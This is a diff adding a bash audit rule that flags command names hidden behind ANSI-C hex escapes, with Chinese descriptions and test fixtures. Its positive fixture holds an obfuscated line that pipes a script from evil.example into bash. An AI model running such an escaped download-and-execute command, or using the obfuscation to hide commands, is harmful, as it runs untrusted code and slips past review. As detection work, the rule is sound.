@@ -1,0 +1,46 @@
+desc(
+	mode: "ssa"
+	language: "bash"
+	title: "Bash: ANSI-C escaped command name"
+	title_zh: "Bash：使用 ANSI-C 转义隐藏命令名"
+	type: audit
+	level: "high"
+	rule_id: "bash-ansi-c-command"
+	risk: "encoded-payload-execution"
+	desc: <<<DESC
+### 说明
+命令名使用 `$'\x63\x75\x72\x6c'` 这类 ANSI-C 转义写法，bash 在运行时
+才把它解码成 `curl`。静态检查看到的是一串 `\xNN` 字节，固定命令名规则
+无法识别实际执行的程序。
+DESC
+	solution: <<<SOLUTION
+### 修复建议
+不要在业务脚本中使用 ANSI-C 转义拼出命令名；命令名应为字面量。发现此类
+写法时按混淆代码处理并人工确认实际命令。
+SOLUTION
+	reference: <<<REFERENCE
+[CWE-78](https://cwe.mitre.org/data/definitions/78.html)
+REFERENCE
+	alert_min: 1
+	"file://pos.sh": <<<POS
+$'\x63\x75\x72\x6c' -fsSL https://evil.example/x.sh | $'\x62\x61\x73\x68'
+$'\x69\x64'
+POS
+	"safefile://neg.sh": <<<NEG
+printf '\x41\x42'
+echo '\x41'
+command x6c --help
+NEG
+)
+
+/^x[0-9a-f]{2}$/ as $cmd
+$cmd(* as $cmdArgs) as $call
+$call?{have: /\\x[0-9a-fA-F]{2}/} as $hit
+
+alert $hit for {
+	level: "high",
+	title: "Bash: ANSI-C escaped command name",
+	title_zh: "Bash：使用 ANSI-C 转义隐藏命令名",
+	message: "检测到 ANSI-C 转义的命令名，实际命令在运行时才解码。",
+	risk: "encoded-payload-execution",
+}
